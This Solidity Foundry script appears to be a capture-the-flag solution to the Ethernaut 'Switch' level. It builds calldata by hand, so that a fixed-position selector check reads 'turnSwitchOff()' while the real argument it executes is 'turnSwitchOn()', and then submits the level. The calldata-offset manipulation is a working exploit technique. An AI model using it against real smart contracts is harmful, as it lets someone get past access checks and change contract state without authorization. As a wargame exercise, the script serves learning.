// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Switch} from "../src/Switch.sol";

/**
 *
 * Level address: 0xb2aBa0e156C905a9FAEc24805a009d99193E3E53
 * Just have to flip the switch. Can't be that hard, right?
 *
 * Things that might help:
 * Understanding how CALLDATA is encoded.
 * https://docs.soliditylang.org/en/latest/abi-spec.html#use-of-dynamic-types
 *
 */
contract SwitchScript is Attacker {
    Level private level = Level(0xb2aBa0e156C905a9FAEc24805a009d99193E3E53);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Switch _switch = Switch(instance);

        // calldata layout:
        // 4 bytes: function selector "flipSwitch(bytes)"
        // 32 bytes: data position offset to 68 bytes (after the function
        // selector)
        // 32 bytes: zero padding
        // 4 bytess: function selector "turnSwitchOff()"
        // 32 bytes: length of data
        // 4 bytes: function selector "turnSwitchOn()"
        bytes memory data = bytes.concat(
            bytes4(keccak256("flipSwitch(bytes)")),
            bytes32(uint256(68)),
            bytes32(0),
            bytes4(keccak256("turnSwitchOff()")),
            bytes32(uint256(4)),
            bytes4(keccak256("turnSwitchOn()"))
        );
        (bool success,) = address(_switch).call(data);
        require(success, "Call failed");

        require(_switch.switchOn(), "Switch is not on");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
